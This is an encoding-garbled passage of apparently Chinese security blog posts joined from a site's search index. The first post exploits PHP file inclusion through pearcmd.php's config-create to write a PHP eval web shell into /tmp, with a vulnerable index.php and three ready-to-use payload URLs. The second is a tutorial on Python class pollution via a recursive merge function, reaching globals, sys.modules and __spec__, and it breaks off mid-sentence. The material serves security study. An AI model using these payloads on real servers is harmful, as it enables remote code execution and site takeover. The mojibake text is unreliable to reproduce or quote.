ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨/usr/local/lib/php å®‰è£…1sudo apt install php-pear linuxé»˜è®¤è·¯å¾„ 1/usr/share/php/pearcmd.php å½“æˆ‘æŸ¥çœ‹pearå’Œpecä¸ªæ–‡ä»¶æœ‰ä»€ä¹ˆåŒºåˆ«æ—¶ï¼›ä½ ä¼šå‘ç°è¿™ä¸ªæ–‡ä»¶åªæœ‰æœ€åä¸€è¡Œä¸å¤ªä¸€æ ·ï¼ŒåŸºæœ¬éƒ½æ˜¯å»è°ƒç”¨äº†/usr/share/php/peclcmd.php 1234567â”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/php]â””â”€$ which pecl /usr/bin/pecl â”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/php]â””â”€$ which pear/usr/bin/pear /usr/share/php/peclcmd.phpå…¶å®æ²¡ä»€ä¹ˆç”¨ï¼Œå°±æ˜¯æ£€æŸ¥ä¸€ä¸‹è·¯å¾„ï¼Œå†å»åŒ…å«pearcmd.phpï¼Œå½“ä½ ä½¿ç”¨peclæˆ–pearå‘½ä»¤æ˜¯ï¼Œå…¶æœ¬è´¨å°±æ˜¯å»è¿è¡Œäº†pearcmd.phpæ–‡ä»¶ï¼Œå¯ä»¥è¯´pearcmd.phpæ–‡ä»¶å°±æ˜¯pearæˆ–peclå‘½ä»¤è¡Œçš„æºç ;(è¿™é‡Œå½“æ—¶æˆ‘è¿˜æŠŠperlå’Œpeclææ··æ·†äº†ï¼‰ 1234567891011121314#peclcmd.php&lt;?phpif ('/usr/share/php ' != '@'.'include_path'.'@ ') { ini_set('include_path', trim('/usr/share/php '). PATH_SEPARATOR . get_include_path()); $raw = false;} else { ini_set('include_path', __DIR__ . PATH_SEPARATOR . get_include_path()); $raw = true;}define('PEAR_RUNTYPE', 'pecl');require_once 'pearcmd.php';?&gt; æ¼æ´åˆ©ç”¨æ¼æ´åˆ©ç”¨æ¼æ´åˆ©ç”¨ï¼šinclude+register_argc_argv=on+pearcmd.php åœ¨Console/Getopt.phpä¸­çš„readPHPArgvå‡½æ•°ä¸­å¯ä»¥é€šè¿‡Webè®¿é—®äº†pearå‘½ä»¤è¡Œçš„åŠŸèƒ½ï¼Œä¸”èƒ½å¤Ÿæ§åˆ¶å‘½ä»¤è¡Œçš„å‚æ•° 123456789101112131415public static function readPHPArgv(){ global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv;} åœ¨pearä¸­æœ‰ä¸€ä¸ªconfig-createå‚æ•°å¯ä»¥åˆ›å»ºæ–‡ä»¶ï¼Œè¿™ä¸ªå‘½ä»¤éœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¼šè¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­(è¿™ä¸ªå‚æ•°ä¹Ÿè¦ä¹Ÿ/å¼€å¤´) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960â”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/php]â””â”€$ php pearcmd.php | grep config-createconfig-create Create a Default configuration fileâ”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/php]â””â”€$ pear config-createconfig-create: must have 2 parameters, root path and filename to save asâ”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/php]â””â”€$ pear config-create /zixyd_good_boy /tmp/zixydConfiguration (channel pear.php.net):=====================================Auto-discover new Channels auto_discover &lt;not set&gt;Default Channel default_channel pear.php.netHTTP Proxy Server Address http_proxy &lt;not set&gt;PEAR server [DEPRECATED] master_server &lt;not set&gt;Default Channel Mirror preferred_mirror &lt;not set&gt;Remote Configuration File remote_config &lt;not set&gt;PEAR executables directory bin_dir /zixyd_good_boy/pearPEAR documentation directory doc_dir /zixyd_good_boy/pear/docsPHP extension directory ext_dir /zixyd_good_boy/pear/extPEAR directory php_dir /zixyd_good_boy/pear/phpPEAR Installer cache directory cache_dir /zixyd_good_boy/pear/cachePEAR configuration file cfg_dir /zixyd_good_boy/pear/cfgdirectoryPEAR data directory data_dir /zixyd_good_boy/pear/dataPEAR Installer download download_dir /zixyd_good_boy/pear/downloaddirectorySystems manpage files man_dir /zixyd_good_boy/pear/mandirectoryPEAR metadata directory metadata_dir &lt;not set&gt;PHP CLI/CGI binary php_bin &lt;not set&gt;php.ini location php_ini &lt;not set&gt;--program-prefix passed to php_prefix &lt;not set&gt;PHP's ./configure--program-suffix passed to php_suffix &lt;not set&gt;PHP's ./configurePEAR Installer temp directory temp_dir /zixyd_good_boy/pear/tempPEAR test directory test_dir /zixyd_good_boy/pear/testsPEAR www files directory www_dir /zixyd_good_boy/pear/wwwCache TimeToLive cache_ttl &lt;not set&gt;Preferred Package State preferred_state &lt;not set&gt;Unix file mask umask &lt;not set&gt;Debug Log Level verbose &lt;not set&gt;PEAR password (for password &lt;not set&gt;maintainers)Signature Handling Program sig_bin &lt;not set&gt;Signature Key Directory sig_keydir &lt;not set&gt;Signature Key Id sig_keyid &lt;not set&gt;Package Signature Type sig_type &lt;not set&gt;PEAR username (for username &lt;not set&gt;maintainers)User Configuration File Filename /tmp/zixydSystem Configuration File Filename #no#system#config#Successfully created default configuration file &quot;/tmp/zixyd&quot;â”Œâ”€â”€(kaliã‰¿kali)-[/usr/share/php]â””â”€$ cat /tmp/zixyd #PEAR_Config 0.9a:12:{s:7:&quot;php_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/php&quot;;s:8:&quot;data_dir&quot;;s:25:&quot;/zixyd_good_boy/pear/data&quot;;s:7:&quot;www_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/www&quot;;s:7:&quot;cfg_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/cfg&quot;;s:7:&quot;ext_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/ext&quot;;s:7:&quot;doc_dir&quot;;s:25:&quot;/zixyd_good_boy/pear/docs&quot;;s:8:&quot;test_dir&quot;;s:26:&quot;/zixyd_good_boy/pear/tests&quot;;s:9:&quot;cache_dir&quot;;s:26:&quot;/zixyd_good_boy/pear/cache&quot;;s:12:&quot;download_dir&quot;;s:29:&quot;/zixyd_good_boy/pear/download&quot;;s:8:&quot;temp_dir&quot;;s:25:&quot;/zixyd_good_boy/pear/temp&quot;;s:7:&quot;bin_dir&quot;;s:20:&quot;/zixyd_good_boy/pear&quot;;s:7:&quot;man_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/man&quot;;} å®éªŒä¸€åˆ›å»ºä¸€ä¸ªindex.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š 123456789&lt;?phphighlight_file(__FILE__);if($_GET['zixyd']){ include $_GET['zixyd'];}phpinfo();?&gt; payload,ä¸‹é¢å‡ ç§éƒ½å¯ä»¥ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼›å°è¯•è‡ªå·±ç†è§£ä¸€ä¸‹ 1/index.php?+config-create+/&amp;zixyd=/usr/share/php/pearcmd.php&amp;/&lt;?=eval($_POST[1])?&gt;+/tmp/test1.php 1/index.php?&amp;zixyd=/usr/share/php/pearcmd.php&amp;+config-create+/&lt;?=eval($_POST[1])?&gt;+/tmp/test2.php 1/index.php?+config-create+/&lt;?=eval($_POST[1])?&gt;&amp;zixyd=/usr/share/php/pearcmd.php&amp;+/tmp/test3.php ç–‘æƒ‘ä¸ºä»€ä¹ˆconfig-createå‚æ•°éƒ½è¦ä»ç¬¬äºŒä¸ªå‚æ•°å¼€å§‹ï¼š","link":"/2024/01/08/pearcmd/"},{"title":"pythonåŸå‹æ±¡æŸ“","text":"å‰è¨€æœ¬æ–‡å¤§éƒ¨åˆ†å‚è€ƒï¼šArticle_kelpï¼› æœ¬äººæ›´å…·Article_kelpå¸ˆå‚…çš„åšå®¢æ‰€ç»™çš„å®éªŒæ–‡ä»¶åœ¨æœ¬åœ°æµ‹è¯•äº†ä¸€éï¼›å…¶ä¸­çœç•¥äº†ä¸€äº›åŸç†ï¼Œä¹ŸåŠ å…¥è‡ªå·±ä¸€ç‚¹ç‚¹æƒ³æ³•; å¦‚æœä¹‹å‰äº†è§£SSTIæ¼æ´å’ŒjsåŸå‹æ±¡æŸ“çš„è¯ï¼Œä¹Ÿè®¸å­¦èµ·æ¥ä¼šè½»æ¾ç‚¹ï¼› ä»£ç å±•ç¤ºåˆå¹¶å‡½æ•°å°±åƒJavascriptçš„åŸå‹é“¾æ±¡æŸ“ä¸€æ ·ï¼ŒåŒæ ·éœ€è¦ä¸€ä¸ªæ•°å€¼åˆå¹¶å‡½æ•°å°†ç‰¹å®šå€¼æ±¡æŸ“åˆ°ç±»çš„å±æ€§å½“ä¸­ï¼Œä¸€ä¸ªæ ‡å‡†ç¤ºä¾‹å¦‚ä¸‹ 1234567891011def merge(src, dst): for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) hasattr() å‡½æ•°ç”¨äºåˆ¤æ–­å¯¹è±¡æ˜¯å¦åŒ…å«å¯¹åº”çš„å±æ€§; getattr() å‡½æ•°ç”¨äºè¿”å›ä¸€ä¸ªå¯¹è±¡å±æ€§å€¼ã€‚ setattr() å‡½æ•°å¯¹åº”å‡½æ•° getattr()ï¼Œç”¨äºè®¾ç½®å±æ€§å€¼ï¼Œè¯¥å±æ€§ä¸ä¸€å®šæ˜¯å­˜åœ¨çš„ æ±¡æŸ“ç¤ºä¾‹ç”±äºPythonä¸­çš„ç±»ä¼šç»§æ‰¿çˆ¶ç±»ä¸­çš„å±æ€§ï¼Œè€Œç±»ä¸­å£°æ˜ï¼ˆå¹¶ä¸æ˜¯å®ä¾‹ä¸­å£°æ˜ï¼‰çš„å±æ€§æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è¿™äº›åœ¨å¤šä¸ªç±»ã€ç¤ºä¾‹ä¸­ä»ç„¶æŒ‡å‘å”¯ä¸€çš„å±æ€§ï¼Œå¦‚ç±»ä¸­è‡ªå®šä¹‰å±æ€§åŠä»¥__å¼€å¤´çš„å†…ç½®å±æ€§ç­‰ 123456789101112131415161718192021222324252627282930313233343536class father: secret = &quot;haha&quot;class son_a(father): passclass son_b(father): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;secret&quot; : &quot;no way&quot; } }}print(son_a.secret) #hahaprint(instance.secret) #hahamerge(payload, instance)print(son_a.secret) #no wayprint(instance.secret) #no way ä¸å¦¨èŠ±ç‚¹æ—¶é—´çœ‹çœ‹è¿™æ®µä»£ç æ˜¯æ€ä¹ˆé€šè¿‡mergeå‡½æ•°æ±¡æŸ“çš„ï¼› 12345678910111213141516171819def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v) #ç¬¬ä¸€æ¬¡mergekä¸º&quot;__class__&quot;;vä¸º{'__base__': {'secret': 'no way'}};instanceå¹¶æ²¡æœ‰'__getitem__'å±æ€§ï¼Œè·³åˆ°ç¬¬ä¸€ä¸ªelif;ifåˆ¤æ–­ä¸ºçœŸï¼Œè¿›å…¥é€’å½’mergeå‡½æ•°;å‚æ•°åˆ†åˆ«æ˜¯&lt;class '__main__.son_b'&gt;å’Œ{'__base__': {'secret': 'no way'}}#ç¬¬äºŒæ¬¡mergeæ­¤æ—¶kä¸º&quot;__base__&quot;;vä¸º{'secret': 'no way'};ç¬¬ä¸€ä¸ªifä»æ—§ä¸ºå‡ï¼›è·³åˆ°ç¬¬ä¸€ä¸ªelif;ifåˆ¤æ–­ä¸ºçœŸï¼Œè¿›å…¥é€’å½’mergeå‡½æ•°;å‚æ•°åˆ†åˆ«æ˜¯&lt;class '__main__.father'&gt;å’Œ{'secret': 'no way'}#ç¬¬ä¸‰æ¬¡mergeæ­¤æ—¶kä¸ºsecretï¼›vä¸ºno way;ç¬¬ä¸€ä¸ªifä»æ—§ä¸ºå‡ï¼›è·³åˆ°ç¬¬ä¸€ä¸ªelif;ç”±äºä¸æ˜¯å­—å…¸ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªelifä¸ºå‡ï¼›æ‰§è¡Œsetattrå‡½æ•°ï¼Œæ­¤æ—¶dstå°±æ˜¯ä¸ºå½¢å‚&lt;class '__main__.father'&gt;ï¼›kä¸ºsecret;vä¸ºno wayï¼›è‡³æ­¤æ±¡æŸ“æˆåŠŸ ä¿®æ”¹å†…ç½®å±æ€§ä¹Ÿæ˜¯ç±»ä¼¼ï¼š 12345678910111213141516171819202122232425262728293031323334class father: passclass son_a(father): passclass son_b(father): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = son_b()payload = { &quot;__class__&quot; : { &quot;__base__&quot; : { &quot;__str__&quot; : &quot;Polluted ~&quot; } }}print(father.__str__) #&lt;slot wrapper '__str__' of 'object' objects&gt;merge(payload, instance)print(father.__str__) #Polluted ~ æ— æ³•æ±¡æŸ“çš„Objectæ­£å¦‚å‰é¢æ‰€è¿°ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»çš„å±æ€§éƒ½å¯ä»¥è¢«æ±¡æŸ“ï¼Œå¦‚Objectçš„å±æ€§å°±æ— æ³•è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥éœ€è¦ç›®æ ‡ç±»èƒ½å¤Ÿè¢«åˆ‡å…¥ç‚¹ç±»æˆ–å¯¹è±¡å¯ä»¥é€šè¿‡å±æ€§å€¼æŸ¥æ‰¾è·å–åˆ° 1234567891011121314151617181920def merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)payload = { &quot;__class__&quot; : { &quot;__str__&quot; : &quot;Polluted ~&quot; } }merge(payload, object) #TypeError: can't set attributes of built-in/extension type 'object' åˆ©ç”¨åœ¨ä»£ç å±•ç¤ºéƒ¨åˆ†æ‰€ç»™å‡ºçš„ä¾‹å­ä¸­ï¼Œæ±¡æŸ“ç±»å±æ€§æ˜¯é€šè¿‡ç¤ºä¾‹çš„__base__å±æ€§æŸ¥æ‰¾åˆ°å…¶ç»§æ‰¿çš„çˆ¶ç±»ï¼Œä½†æ˜¯å¦‚æœç›®æ ‡ç±»ä¸åˆ‡å…¥ç‚¹ç±»æˆ–å®ä¾‹æ²¡æœ‰ç»§æ‰¿å…³ç³»æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ˜¾å¾—ååˆ†æ— åŠ› å…¨å±€å˜é‡è·å–åœ¨Pythonä¸­ï¼Œå‡½æ•°æˆ–ç±»æ–¹æ³•ï¼ˆå¯¹äºç±»çš„å†…ç½®æ–¹æ³•å¦‚__init__è¿™äº›æ¥è¯´ï¼Œå†…ç½®æ–¹æ³•åœ¨å¹¶æœªé‡å†™æ—¶å…¶æ•°æ®ç±»å‹ä¸ºè£…é¥°å™¨å³wrapper_descriptorï¼Œåªæœ‰åœ¨é‡å†™åæ‰æ˜¯å‡½æ•°functionï¼‰å‡å…·æœ‰ä¸€ä¸ª__globals__å±æ€§ï¼Œè¯¥å±æ€§å°†å‡½æ•°æˆ–ç±»æ–¹æ³•æ‰€ç”³æ˜çš„å˜é‡ç©ºé—´ä¸­çš„å…¨å±€å˜é‡ä»¥å­—å…¸çš„å½¢å¼è¿”å›ï¼ˆç›¸å½“äºè¿™ä¸ªå˜é‡ç©ºé—´ä¸­çš„globalså‡½æ•°çš„è¿”å›å€¼ 1234567891011secret_var = 114def test(): passclass a: def __init__(self): passprint(test.__globals__ == globals() == a.__init__.__globals__) #Trueprint(test.__globals__)#{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000163B99A4760&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': 'D:\\\\Project\\\\ctf\\\\test2.py', '__cached__': None, 'secret_var': 114, 'test': &lt;function test at 0x00000163B999F040&gt;, 'a': &lt;class '__main__.a'&gt;} æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨__globlasl__æ¥è·å–åˆ°å…¨å±€å˜é‡ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹æ— ç»§æ‰¿å…³ç³»çš„ç±»å±æ€§ç”šè‡³å…¨å±€å˜é‡; 123456789101112131415161718192021222324252627282930313233343536373839404142434445secret_var = 114def test(): passclass a: secret_class_var = &quot;secret&quot; def __init__(self): self.name= &quot;zixyd&quot;class b: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = b()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;secret_var&quot; : 514, &quot;a&quot; : { &quot;secret_class_var&quot; : &quot;Pooooluted ~&quot; } } } }print(a.secret_class_var) #secretprint(secret_var) #114merge(payload, instance)print(a.secret_class_var) #Pooooluted ~print(secret_var) #514 æˆ‘æƒ³å°è¯•ä¿®æ”¹self.nameçš„å€¼ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼› å·²åŠ è½½æ¨¡å—è·å–å±€é™äºå½“å‰æ¨¡å—çš„å…¨å±€å˜é‡è·å–æ˜¾ç„¶ä¸å¤Ÿï¼Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦å¯¹å¹¶ä¸æ˜¯å®šä¹‰åœ¨å…¥å£æ–‡ä»¶ä¸­çš„ç±»å¯¹è±¡æˆ–è€…å±æ€§ï¼Œè€Œæˆ‘ä»¬çš„æ“ä½œä½ç½®åˆåœ¨å…¥å£æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å¯¹å…¶ä»–åŠ è½½è¿‡çš„æ¨¡å—æ¥è·å–äº† åŠ è½½å…³ç³»ç®€å•åœ¨åŠ è½½å…³ç³»ç®€å•çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»æ–‡ä»¶çš„importè¯­æ³•éƒ¨åˆ†æ‰¾åˆ°ç›®æ ‡æ¨¡å—ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è·å–å…¨å±€å˜é‡æ¥å¾—åˆ°ç›®æ ‡æ¨¡å— 123456789101112131415161718192021222324252627282930313233343536373839404142#test.pyimport test_1class cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } }}print(test_1.secret_var) #secretprint(test_1.target_class.secret_class_var) #114merge(payload, instance) print(test_1.secret_var) ##514print(test_1.target_class.secret_class_var) #Poluuuuuuted ~ 123456#test_1.pysecret_var = 114class target_class: secret_class_var = &quot;secret&quot; åŠ è½½å…³ç³»å¤æ‚å¦‚CTFé¢˜ç›®ç­‰å®é™…ç¯å¢ƒä¸­å¾€å¾€æ˜¯å¤šå±‚æ¨¡å—å¯¼å…¥ï¼Œç”šè‡³æ˜¯å­˜åœ¨äºå†…ç½®æ¨¡å—æˆ–ä¸‰æ–¹æ¨¡å—ä¸­å¯¼å…¥ï¼Œè¿™ä¸ªæ—¶å€™é€šè¿‡ç›´æ¥çœ‹ä»£ç æ–‡ä»¶ä¸­importè¯­æ³•æŸ¥æ‰¾å°±ååˆ†å›°éš¾ï¼Œè€Œè§£å†³æ–¹æ³•åˆ™æ˜¯åˆ©ç”¨sysæ¨¡å— sysæ¨¡å—çš„moduleså±æ€§ä»¥å­—å…¸çš„å½¢å¼åŒ…å«äº†ç¨‹åºè‡ªå¼€å§‹è¿è¡Œæ—¶æ‰€æœ‰å·²åŠ è½½è¿‡çš„æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ä»è¯¥å±æ€§ä¸­è·å–åˆ°ç›®æ ‡æ¨¡å— 123456789101112131415161718192021222324252627282930313233343536373839404142434445#test.pyimport test_1import sysclass cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;sys&quot; : { &quot;modules&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } } } }}print(test_1.secret_var) #secretprint(test_1.target_class.secret_class_var) #114merge(payload, instance)print(test_1.secret_var) #514print(test_1.target_class.secret_class_var) #Poluuuuuuted ~ 123456#test_1.pysecret_var = 114class target_class: secret_class_var = &quot;secret&quot; å½“ç„¶æˆ‘ä»¬å»ä½¿ç”¨çš„Payloadç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯ä¸ä¼šè¿™æ ·çš„ï¼Œå¦‚ä¸Šçš„Payloadå®é™…ä¸Šæ˜¯åœ¨å·²ç»import sysçš„æƒ…å†µä¸‹ä½¿ç”¨çš„ï¼Œè€Œå¤§éƒ¨åˆ†æƒ…å†µæ˜¯æ²¡æœ‰ç›´æ¥å¯¼å…¥çš„ï¼Œè¿™æ ·é—®é¢˜å°±ä»å¯»æ‰¾importç‰¹å®šæ¨¡å—çš„è¯­å¥è½¬æ¢ä¸ºå¯»æ‰¾importäº†sysæ¨¡å—çš„è¯­å¥ï¼Œå¯¹é—®é¢˜è§£å†³çš„å¹¶ä¸è§å¾—æœ‰å¤šå°‘ä¼˜åŒ– åŠ è½½å…³ç³»å¤æ‚-å®é™…ä½¿ç”¨å¦‚æœæ²¡æœ‰å¯¼å…¥sysï¼Œå¯ä»¥åˆ©ç”¨åˆ«çš„æ¨¡å—å¾—åˆ°sysæ¨¡å—ï¼›ç›´æ¥é‡‡ç”¨&lt;æ¨¡å—å&gt;.__spec__.__init__.__globals__['sys']è·å–åˆ°sysæ¨¡å—ï¼› ä¸»è¦æ˜¯é€šè¿‡åŠ è½½å™¨loaderï¼›loaderå°±æ˜¯ä¸ºå®ç°æ¨¡å—åŠ è½½è€Œè®¾è®¡çš„ç±»ï¼Œå…¶åœ¨importlibè¿™ä¸€å†…ç½®æ¨¡å—ä¸­æœ‰å…·ä½“å®ç°ã€‚ä»¤äººåº†å¹¸çš„æ˜¯importlibæ¨¡å—ä¸‹æ‰€æœ‰çš„pyæ–‡ä»¶ä¸­å‡å¼•å…¥äº†sysæ¨¡å— 123456789101112131415161718print(&quot;sys&quot; in dir(__import__(&quot;importlib.__init__&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib._bootstrap_external&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib._common&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.abc&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.machinery&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.metadata&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.resources&quot;)))#Trueprint(&quot;sys&quot; in dir(__import__(&quot;importlib.util&quot;)))#True __spec__å†…ç½®å±æ€§åœ¨Python 3.4ç‰ˆæœ¬å¼•å…¥ï¼Œå…¶åŒ…å«äº†å…³äºç±»åŠ è½½æ—¶çš„ä¿¡æ¯ï¼Œæœ¬èº«æ˜¯å®šä¹‰åœ¨Lib/importlib/_bootstrap.pyçš„ç±»ModuleSpecï¼Œæ˜¾ç„¶å› ä¸ºå®šä¹‰åœ¨importlibæ¨¡å—ä¸‹çš„pyæ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡‡ç”¨&lt;æ¨¡å—å&gt;.__spec__.__init__.__globals__['sys']è·å–åˆ°sysæ¨¡å—ï¼Œ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#test.pyimport test_1# import sysimport requestsclass cls: def __init__(self): passdef merge(src, dst): # Recursive merge function for k, v in src.items(): if hasattr(dst, '__getitem__'): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)instance = cls()payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;requests&quot;:{ &quot;__spec__&quot;:{ &quot;__init__&quot;:{ &quot;__globals__&quot;:{ &quot;sys&quot;: { &quot;modules&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } } } } } } } }}print(test_1.secret_var) #secretprint(test_1.target_class.secret_class_var) #114merge(payload, instance)print(test_1.secret_var) #514print(test_1.target_class.secret_class_var) #Poluuuuuuted ~ 123456#test_1.pysecret_var = 114class target_class: secret_class_var = &quot;secret&quot; æˆ–è€…ä¸‹é¢è¿™ç§æ–¹å¼ä¹Ÿå¯ä»¥ 12345class a: def __init__(self): passprint(a.__init__.__globals__['__loader__'].__init__.__globals__['sys']) #&lt;module 'sys' (built-in)&gt; 12345678910111213141516171819202122payload = { &quot;__init__&quot; : { &quot;__globals__&quot; : { &quot;__loader__&quot;: { &quot;__init__&quot;: { &quot;__globals__&quot;ï¼š { &quot;sys&quot;: { &quot;modules&quot; : { &quot;test_1&quot; : { &quot;secret_var&quot; : 514, &quot;target_class&quot; : { &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot; } } } } } } } } }} æ”»å‡»é¢æ‰©å±•å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢ä¸»è¦ç”¨åˆ°äº†å‡½æ•°çš„__defaults__å’Œ__kwdefaults__è¿™ä¸¤ä¸ªå†…ç½®å±æ€§ __defaults____defaults__ä»¥å…ƒç»„çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°çš„ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œéœ€è¦æ³¨æ„è¿™ä¸ªä½ç½®æˆ–é”®å€¼å½¢å‚æ˜¯ç‰¹å®šçš„ä¸€ç±»å½¢å‚ï¼Œå¹¶ä¸æ˜¯ä½ç½®å½¢å‚+é”®å€¼å½¢å‚ï¼Œå…³äºå‡½æ•°çš„å‚æ•°åˆ†ç±»å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼špythonå‡½æ•°çš„ä½ç½®å‚æ•°(Positional)å’Œå…³é”®å­—å‚æ•°(keyword) - çŸ¥ä¹ (zhihu.com) ä»ä»£ç ä¸Šæ¥çœ‹ï¼Œåˆ™æ˜¯å¦‚ä¸‹çš„æ•ˆæœï¼š 12345678910111213141516def func_a(var_1, var_2 =2, var_3 = 3): passdef func_b(var_1, /, var_2 =2, var_3 = 3): passdef func_c(var_1, var_2 =2, *, var_3 = 3): passdef func_d(var_1, /, var_2 =2, *, var_3 = 3): passprint(func_a.__defaults__) #(2, 3)print(func_b.__defaults__) #(2, 3)print(func_c.__defaults__) #(2,)print(func_d.__defaults__) #(2,) é€šè¿‡æ›¿æ¢è¯¥å±æ€§ä¾¿èƒ½å®ç°å¯¹å‡½æ•°ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼æ›¿æ¢ï¼Œä½†ç¨æœ‰é—®é¢˜çš„æ˜¯è¯¥å±æ€§å€¼è¦æ±‚ä¸ºå…ƒç»„ç±»å‹ï¼Œè€Œé€šå¸¸çš„å¦‚JSONç­‰æ 